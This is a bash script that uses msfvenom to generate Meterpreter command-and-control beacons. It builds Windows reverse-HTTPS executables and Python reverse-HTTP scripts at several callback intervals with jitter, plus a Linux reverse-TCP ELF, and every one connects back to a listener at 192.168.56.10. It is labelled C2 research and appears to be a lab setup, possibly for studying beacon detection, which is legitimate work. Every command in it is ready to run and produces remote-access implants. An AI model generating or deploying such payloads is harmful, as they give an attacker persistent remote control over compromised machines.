#!/bin/bash

# Configuration
LHOST="192.168.56.10"
OUTPUT_DIR="/home/kali/Desktop/c2/msf-c2/payloads"
JITTER=10

# Interval to Port Mapping
# 10s -> 4444, 30s -> 4445, 60s -> 4446
get_port() {
    case $1 in
        10) echo "4444" ;;
        30) echo "4445" ;;
        60) echo "4446" ;;
        *)  echo "4447" ;;
    esac
}

# Create output directories
mkdir -p $OUTPUT_DIR/windows $OUTPUT_DIR/linux

echo "[*] Generating C2 Research Payloads (Separate Ports + Jitter)..."

INTERVALS=(10 30 60)

for INTERVAL in "${INTERVALS[@]}"; do
    PORT=$(get_port $INTERVAL)
    echo "--------------------------------------------------"
    echo "[*] Processing $INTERVAL second interval (Port $PORT)..."
    echo "--------------------------------------------------"

    # 1. Windows Reverse HTTPS (Persistent Choice)
    echo "[+] Generating Windows HTTPS Beacon (${INTERVAL}s, Jitter ${JITTER}%)..."
    msfvenom -p windows/meterpreter/reverse_https \
        LHOST=$LHOST LPORT=$PORT \
        HttpWait=$INTERVAL \
        HttpJitter=$JITTER \
        -f exe -o $OUTPUT_DIR/windows/win_beacon_https_${INTERVAL}s.exe

    # 2. Python Multi-Platform Beacon (Alternative)
    echo "[+] Generating Python Beacon (${INTERVAL}s)..."
    msfvenom -p python/meterpreter/reverse_http \
        LHOST=$LHOST LPORT=$PORT \
        HttpWait=$INTERVAL \
        -f raw -o $OUTPUT_DIR/linux/beacon_${INTERVAL}s.py
done

# 3. Legacy Linux ELF (TCP) - Static Port 4447
echo "--------------------------------------------------"
echo "[+] Generating Legacy Linux TCP Beacon..."
msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=$LHOST LPORT=4447 \
    -f elf -o $OUTPUT_DIR/linux/linux_beacon_tcp

echo "--------------------------------------------------"
echo "[*] Payload generation complete!"
echo "[*] Payloads saved in: $OUTPUT_DIR"
ls -R $OUTPUT_DIR
